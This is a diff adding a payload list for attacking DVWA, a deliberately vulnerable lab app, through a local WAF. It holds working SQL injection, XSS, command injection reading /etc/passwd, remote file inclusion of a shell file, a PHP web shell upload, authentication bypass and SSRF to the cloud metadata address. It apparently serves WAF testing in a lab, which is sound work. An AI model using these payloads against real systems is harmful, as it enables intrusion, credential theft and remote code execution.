@@ -1,0 +1,106 @@
+DVWA attack hits via WAF (authorized local lab only)
+Base target: http://localhost:8080
+Note: Always run through :8080 (WAF), not :8888 (direct DVWA).
+
+========================================
+1) SQL Injection (GET)
+========================================
+http://localhost:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit
+http://localhost:8080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2C2--+-&Submit=Submit
+
+========================================
+2) Blind SQL Injection (GET)
+========================================
+http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1--+-&Submit=Submit
+http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP%285%29--+-&Submit=Submit
+
+========================================
+3) XSS Reflected (GET)
+========================================
+http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+http://localhost:8080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+
+========================================
+4) XSS Stored (POST)
+========================================
+curl -i -X POST "http://localhost:8080/vulnerabilities/xss_s/" \
+	-H "Content-Type: application/x-www-form-urlencoded" \
+	--data "txtName=tester&mtxMessage=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&btnSign=Sign+Guestbook"
+
+========================================
+5) CSRF (GET)
+========================================
+http://localhost:8080/vulnerabilities/csrf/?password_new=NewPass%40123&password_conf=NewPass%40123&Change=Change
+
+========================================
+6) Command Injection (GET)
+========================================
+http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bcat+/etc/passwd&Submit=Submit
+http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%26%26id&Submit=Submit
+
+========================================
+7) File Inclusion (LFI/RFI)
+========================================
+http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
+http://localhost:8080/vulnerabilities/fi/?page=../../../../../../windows/win.ini
+http://localhost:8080/vulnerabilities/fi/?page=http://example.com/shell.txt
+
+========================================
+8) File Upload Vulnerability (POST multipart)
+========================================
+curl -i -X POST "http://localhost:8080/vulnerabilities/upload/" \
+	-F "uploaded=@/tmp/shell.php" \
+	-F "Upload=Upload"
+
+========================================
+9) Brute Force Authentication (GET)
+========================================
+http://localhost:8080/vulnerabilities/brute/?username=admin&password=password&Login=Login
+http://localhost:8080/vulnerabilities/brute/?username=admin&password=admin&Login=Login
+
+========================================
+10) Insecure CAPTCHA (module-specific, usually POST)
+========================================
+curl -i -X POST "http://localhost:8080/vulnerabilities/captcha/" \
+	-H "Content-Type: application/x-www-form-urlencoded" \
+	--data "step=1&password_new=NewPass%40123&password_conf=NewPass%40123&Change=Change"
+
+========================================
+11) Weak Session Management (GET)
+========================================
+http://localhost:8080/vulnerabilities/weak_id/?Submit=Submit
+
+========================================
+12) JavaScript Security (module path if enabled)
+========================================
+http://localhost:8080/vulnerabilities/javascript/
+
+========================================
+13) CSP Bypass (module path if enabled)
+========================================
+http://localhost:8080/vulnerabilities/csp/
+
+========================================
+14) Open Redirect (module path if enabled)
+========================================
+http://localhost:8080/vulnerabilities/open_redirect/?redirect=https%3A%2F%2Fexample.com
+
+========================================
+15) Authentication Bypass (login test)
+========================================
+http://localhost:8080/login.php?username=admin%27+OR+%271%27%3D%271&password=test&Login=Login
+
+========================================
+16) Content Spoofing (module path if enabled)
+========================================
+http://localhost:8080/vulnerabilities/spoof/
+
+========================================
+17) SSRF (depends on DVWA version)
+========================================
+http://localhost:8080/vulnerabilities/ssrf/?url=http%3A%2F%2F127.0.0.1
+http://localhost:8080/vulnerabilities/ssrf/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+
+Quick check tips:
+- If a URL returns 404, that DVWA module is not available in your current DVWA version.
+- Some modules require a DVWA login session cookie to work; run requests in browser after login or use curl with cookie jar.
